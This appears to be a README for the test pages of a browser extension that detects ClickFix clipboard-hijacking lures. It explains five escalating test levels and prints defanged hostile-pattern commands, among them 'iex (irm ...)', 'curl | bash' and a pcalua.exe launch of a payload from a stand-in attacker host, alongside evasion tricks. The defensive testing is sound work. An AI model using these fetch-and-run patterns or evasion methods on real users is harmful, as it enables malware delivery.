# Test pages

These pages exercise ClickFix Guard from simple to sophisticated. The commands
they contain are **harmless**, but run them in an isolated environment anyway —
a separate Chrome profile, ideally a VM. Not on a production machine.

## Serving

Open them over `http://` rather than `file://`; some clipboard APIs and the
level 3 `curl` test need a local server.

```bash
cd test-pages
python3 -m http.server 8000
```

- http://localhost:8000/level1-basic.html
- http://localhost:8000/level2-fake-captcha-clipboard.html
- http://localhost:8000/level3-evasion-macos.html
- http://localhost:8000/level4-multistage.html
- http://localhost:8000/level5-keywordless-behavioral.html

## Levels

| Level | Technique | Expected trigger | Expected result |
|---|---|---|---|
| 1 – Basic | Plain text, no JS | Win+R and `powershell` present in the DOM at load | Text score only; banner around the threshold |
| 2 – Fake CAPTCHA | `navigator.clipboard.writeText` plus delayed `display:none` → `block` | Clipboard hook (high weight, keyword matched) plus text | High score, banner appears immediately |
| 3 – Evasion | Full-width Unicode, DOM injection after 3 s, command string split in JS | NFKC normalisation, MutationObserver, runtime clipboard hook | Banner appears after ~3 s, not on the first static scan |
| 4 – Multi-stage | Level 2 inside an iframe, plus an instruction hidden in CSS `::before` | `all_frames: true` scans the iframe too | Banner appears; the `::before` text is **not** caught (known limitation) |
| 5 – Keywordless / behavioural | Flow of an observed campaign: nested `atob()` decode, command never written to the DOM, silent `writeText` on checkbox click | Neither keyword nor opaque-blob match — only "click on a verification control → silent write within 800 ms" (`clipboardAfterVerifyClick`) | Banner appears **only** via the behavioural layer; read alongside the case study in the main README |

## What the commands actually do

**Levels 1 and 4 (Windows).**
`powershell -NoProfile -Command "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aGVsbG8gd29ybGQ='))"`
and `echo aGVsbG8gd29ybGQ= | certutil -decode - -`. Both print `hello world`. No
network access, no file writes.

**Level 2 (Windows).** `iex (irm 'https://www.google.com')` — Google's homepage
isn't valid PowerShell, so `iex` throws a parse error and stops harmlessly. A
classic proof-of-concept pattern: a live request that does nothing.

**Level 3 (macOS).** `curl -s http://localhost:8000/hello.sh | bash`, pointed
deliberately at **your own local server**. Piping `curl` from a third-party
domain into a shell isn't advisable even in a security test, since the domain can
change hands or be intercepted. `hello.sh` only echoes a line.

**Level 5 (Windows).** `pcalua.exe -a \\attacker-test.local\share\payload.exe`.
`attacker-test.local` does not resolve, so nothing is fetched or executed even if
pasted. `pcalua.exe` is a lesser-known LOLBin used in real ClickFix kits to get
around SmartScreen, and it is deliberately **absent** from the lists in
`indicators.js` and `injected.js` — the point of this level is to show that the
behavioural layer stands on its own when the keyword layer is intentionally blind.

## Known limitation

Text injected through CSS `::before`/`::after` (level 4) is not part of
`document.body.innerText` and is therefore not caught. The technique is rare in
the wild — attackers generally rely on clipboard hijacking rather than hiding
text — but a `getComputedStyle(el, '::before').content` scan could be added at a
performance cost.
